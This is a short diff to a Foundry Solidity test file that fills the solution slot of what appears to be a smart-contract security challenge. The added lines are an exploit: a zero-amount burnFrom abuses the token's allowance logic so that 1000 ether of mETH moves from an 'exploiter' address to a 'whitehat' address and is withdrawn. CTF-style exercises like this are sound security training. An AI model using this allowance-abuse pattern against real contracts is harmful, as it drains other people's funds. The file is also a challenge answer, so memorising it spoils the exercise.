@@ -36,8 +36,11 @@ contract Challenge1Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge1Test -vvvv //
         ////////////////////////////////////////////////////*/
-
-    
+        mETH.approve(address(exploiter), 1000 ether);
+        mETH.burnFrom(address(exploiter), 0);
+        mETH.approve(address(exploiter), 0);
+        mETH.transferFrom(address(exploiter), address(whitehat), 1000 ether);
+        mETH.withdraw(1000 ether);
 
         //==================================================//
         vm.stopPrank();
